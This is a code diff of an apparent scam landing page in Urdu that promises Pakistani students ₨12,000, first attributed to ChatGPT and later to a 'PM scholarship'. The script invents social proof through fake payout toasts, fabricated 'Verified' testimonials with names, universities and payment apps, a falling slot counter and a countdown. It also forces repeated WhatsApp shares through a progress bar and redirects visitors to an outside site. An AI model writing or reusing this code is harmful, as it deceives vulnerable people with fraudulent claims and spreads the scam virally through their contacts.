-  localStorage.setItem(REDIRECT_KEY, '1'); // persist so next visit detects it
+  localStorage.setItem(REDIRECT_KEY, '1');
   window.location.href = 'https://mentorship.dilawarpro.com';
 }
 
 // ════════ SECOND VISIT — real WhatsApp share ════════
-let shareNum = 0;
-function realShare(type){
-  shareNum = Math.min(shareNum + 5, 15);
+let shareNum = parseInt(localStorage.getItem('pm_share_count') || '0');
+
+function updateShareProgress(){
   const pct = (shareNum / 15) * 100;
   const bar = document.getElementById('shareBar');
   const cnt = document.getElementById('shareCount');
   if(bar) bar.style.width = pct + '%';
   if(cnt) cnt.textContent = shareNum + ' / 15';
+}
 
-  const txt = type === 'contacts'
-    ? '🎉 ChatGPT پاکستانی طلباء کو ₨12,000 دے رہا ہے!\nمیں نے apply کر لیا — آپ بھی جلدی کریں!\n👇\n' + window.location.href
-    : '⚡ ابھی apply کریں — صرف چند سلاٹ باقی!\n💰 ChatGPT ₨12,000 دے رہا ہے!\n' + window.location.href;
+function realShare(type){
+  shareNum = Math.min(shareNum + 5, 15);
+  localStorage.setItem('pm_share_count', shareNum.toString());
+  updateShareProgress();
 
-  window.open('https://api.whatsapp.com/send?text=' + encodeURIComponent(txt), '_blank');
+  const msg = getWhatsAppMessage();
+  window.open('https://api.whatsapp.com/send?text=' + encodeURIComponent(msg), '_blank');
 }
 
 // ════════ TOASTS ════════
 const TOASTS = [
-  {t:'a',e:'👦',n:'احمد — لاہور',    m:'نے ابھی apply کیا! ✅'},
-  {t:'a',e:'👩',n:'ثنا — کراچی',     m:'نے رجسٹریشن مکمل کی! 🎉'},
-  {t:'a',e:'🧑',n:'بلال — فیصل آباد',m:'کی درخواست موصول ہوئی! 📩'},
-  {t:'a',e:'👧',n:'عائشہ — پشاور',   m:'نے ابھی apply کیا! ✅'},
-  {t:'a',e:'👦',n:'فہد — ملتان',     m:'نے رجسٹریشن کروائی! 🎓'},
-  {t:'a',e:'👩',n:'مریم — حیدرآباد', m:'نے درخواست دی! ✅'},
-  {t:'a',e:'🧔',n:'زید — راولپنڈی',  m:'نے ابھی apply کیا! ✅'},
-  {t:'a',e:'👧',n:'نور — سیالکوٹ',   m:'کی درخواست موصول ہوئی! 📩'},
-  {t:'w',e:'💸',n:'حمزہ — لاہور',    m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 🤑'},
-  {t:'w',e:'🎉',n:'سارہ — کراچی',    m:'کو <span class="t-amt">₨12,000</span> مل گئے! 💚'},
-  {t:'w',e:'💰',n:'عمر — اسلام آباد',m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 😍'},
-  {t:'w',e:'🤑',n:'رضا — گوجرانوالہ',m:'کو <span class="t-amt">₨12,000</span> JazzCash پر آ گئے!'},
-  {t:'w',e:'🎊',n:'فاطمہ — ملتان',   m:'کو <span class="t-amt">₨12,000</span> EasyPaisa پر ملے!'},
-  {t:'w',e:'💸',n:'عادل — کوئٹہ',    m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 🎊'},
+  {t:'a',e:'👦',n:'احمد — لاہور (UET)',      m:'نے ابھی apply کیا! ✅'},
+  {t:'a',e:'👩',n:'ثنا — کراچی (NED)',       m:'نے رجسٹریشن مکمل کی! 🎉'},
+  {t:'a',e:'🧑',n:'بلال — فیصل آباد (GCU)',  m:'کی درخواست موصول ہوئی! 📩'},
+  {t:'a',e:'👧',n:'عائشہ — پشاور (UoP)',     m:'نے ابھی apply کیا! ✅'},
+  {t:'a',e:'👦',n:'فہد — ملتان (BZU)',       m:'نے رجسٹریشن کروائی! 🎓'},
+  {t:'a',e:'👩',n:'مریم — حیدرآباد (MUET)',  m:'نے درخواست دی! ✅'},
+  {t:'a',e:'🧔',n:'زید — اسلام آباد (NUST)', m:'نے ابھی apply کیا! ✅'},
+  {t:'a',e:'👧',n:'نور — سیالکوٹ (UoG)',     m:'کی درخواست موصول ہوئی! 📩'},
+  {t:'w',e:'💸',n:'حمزہ — لاہور (LUMS)',     m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 🤑'},
+  {t:'w',e:'🎉',n:'سارہ — کراچی (IBA)',      m:'کو <span class="t-amt">₨12,000</span> مل گئے! 💚'},
+  {t:'w',e:'💰',n:'عمر — اسلام آباد (QAU)',  m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 😍'},
+  {t:'w',e:'🤑',n:'رضا — گوجرانوالہ (GIFT)', m:'کو <span class="t-amt">₨12,000</span> مل گئے!'},
+  {t:'w',e:'🎊',n:'فاطمہ — ملتان (WUM)',     m:'کو <span class="t-amt">₨12,000</span> ملے!'},
+  {t:'w',e:'💸',n:'عادل — کوئٹہ (UoB)',      m:'نے <span class="t-amt">₨12,000</span> وصول کر لیے! 🎊'},
 ];
 const shuffled = [...TOASTS].sort(()=>Math.random()-.5);
 let tIdx = 0;
@@ -753,40 +792,44 @@ setInterval(()=>{
 
 let slots=500;
 setInterval(()=>{
-  if(slots>10){ slots-=Math.floor(Math.random()*3)+1; document.getElementById('slotsLeft').textContent=slots; }
+  if(slots>10){ slots-=Math.floor(Math.random()*3)+1; const el=document.getElementById('slotsLeft'); if(el) el.textContent=slots; }
 }, 5500);
 
 // hero countdown
 let heroSec = 7*3600+42*60+59;
 setInterval(()=>{
   if(heroSec<=0)return; heroSec--;
-  document.getElementById('cdH').textContent=String(Math.floor(heroSec/3600)).padStart(2,'0');
-  document.getElementById('cdM').textContent=String(Math.floor((heroSec%3600)/60)).padStart(2,'0');
-  document.getElementById('cdS').textContent=String(heroSec%60).padStart(2,'0');
+  const h=document.getElementById('cdH'), m=document.getElementById('cdM'), s=document.getElementById('cdS');
+  if(h) h.textContent=String(Math.floor(heroSec/3600)).padStart(2,'0');
+  if(m) m.textContent=String(Math.floor((heroSec%3600)/60)).padStart(2,'0');
+  if(s) s.textContent=String(heroSec%60).padStart(2,'0');
 },1000);
 
 // ════════ WARNING MODAL ════════
 setTimeout(()=>{
   if(formDone || isSecondVisit) return;
-  document.getElementById('modalSlots').textContent = Math.floor(Math.random()*30)+20;
+  const ms = document.getElementById('modalSlots');
+  if(ms) ms.textContent = Math.floor(Math.random()*30)+20;
   document.getElementById('warnModal').style.display = 'flex';
 }, 14000);
 function closeModal(){
   document.getElementById('warnModal').style.display = 'none';
-  document.getElementById('mainForm')?.scrollIntoView({behavior:'smooth',block:'center'});
+  const form = document.getElementById('mainForm');
+  if(form) form.scrollIntoView({behavior:'smooth',block:'center'});
 }
 
 // ════════ TESTIMONIALS ════════
 const testis=[
-  {e:'👦',av:'#0d8a6a',n:'حمزہ احمد',c:'لاہور',b:'JazzCash',tx:'یقین نہیں آ رہا تھا لیکن واقعی 12 ہزار آ گئے! 🤩'},
-  {e:'👩',av:'#c2185b',n:'ثنا ملک',c:'کراچی',b:'EasyPaisa',tx:'میری سہیلی نے بتایا — پیسے مل گئے! 💚'},
-  {e:'🧔',av:'#1565c0',n:'عمر فاروق',c:'اسلام آباد',b:'Meezan',tx:'100% legit! میرے 3 دوستوں کو بھی مل گئے! 🙌'},
-  {e:'👧',av:'#6a1b9a',n:'عائشہ خان',c:'پشاور',b:'HBL Mobile',tx:'رات apply کیا صبح پیسے تھے! 🎊'},
-  {e:'👦',av:'#e65100',n:'فہد علی',c:'ملتان',b:'SadaPay',tx:'Alhamdulillah! ₨12,000 مل گئے! 🎉'},
-  {e:'👩',av:'#00796b',n:'مریم حسین',c:'فیصل آباد',b:'UBL',tx:'بہت آسان — سب apply کریں! 😊'},
+  {e:'👦',av:'#01411C',n:'حمزہ احمد',c:'لاہور (UET)',tx:'PM اسکالرشپ سے واقعی 12 ہزار آ گئے! 🤩'},
+  {e:'👩',av:'#c2185b',n:'ثنا ملک',c:'کراچی (NED)',tx:'میری سہیلی نے بتایا — اسکالرشپ مل گئی! 💚'},
+  {e:'🧔',av:'#1565c0',n:'عمر فاروق',c:'اسلام آباد (NUST)',tx:'100% legit! میرے 3 دوستوں کو بھی مل گئے! 🙌'},
+  {e:'👧',av:'#6a1b9a',n:'عائشہ خان',c:'پشاور (UoP)',tx:'رات apply کیا صبح پیسے تھے! 🎊'},
+  {e:'👦',av:'#e65100',n:'فہد علی',c:'ملتان (BZU)',tx:'Alhamdulillah! ₨12,000 اسکالرشپ مل گئی! 🎉'},
+  {e:'👩',av:'#00796b',n:'مریم حسین',c:'فیصل آباد (GCU)',tx:'بہت آسان — سب یونیورسٹی طلباء apply کریں! 😊'},
 ];
 function buildCarousel(railId){
   const rail=document.getElementById(railId); if(!rail)return;
+  rail.innerHTML = '';
   [...testis,...testis].forEach(t=>{
     const el=document.createElement('div'); el.className='tt';
     el.innerHTML=`
@@ -796,7 +839,7 @@ function buildCarousel(railId){
         <div class="tt-chip">₨12K ✅</div>
       </div>
       <p class="ur" style="font-size:.74rem;color:var(--sub);line-height:2;">${t.tx}</p>
-      <div style="font-size:.62rem;color:var(--g1);margin-top:5px;">via ${t.b} · ✅ Verified</div>`;
+      <div style="font-size:.62rem;color:var(--g1);margin-top:5px;">PM اسکالرشپ · ✅ Verified</div>`;
     rail.appendChild(el);
   });
 }
@@ -820,6 +863,9 @@ const BANNERS=[
 function buildAds(){
   const grid=document.getElementById('adsGrid');
   const banner=document.getElementById('adsBanner');
+  if(!grid || !banner) return;
+  grid.innerHTML = '';
+  banner.innerHTML = '';
   const picked=[...ADS].sort(()=>Math.random()-.5).slice(0,4);
   picked.forEach(ad=>{
     const el=document.createElement('div'); el.className='ad-tile';
@@ -850,7 +896,7 @@ function buildAds(){
 
 // ════════ CONFETTI ════════
 function launchConfetti(){
-  const cols=['#05c48a','#ffd700','#ff6b6b','#4fc3f7','#ce93d8','#80cbc4','#ffb74d','#f06292'];
+  const cols=['#01411C','#ffd700','#ff6b6b','#4fc3f7','#ce93d8','#80cbc4','#ffb74d','#f06292'];
   const layer=document.getElementById('cfti');
   for(let i=0;i<100;i++){
     const p=document.createElement('div'); p.className='cp';
@@ -861,6 +907,4 @@ function launchConfetti(){
 }
 </script>
 </body>
-
 </html>
-
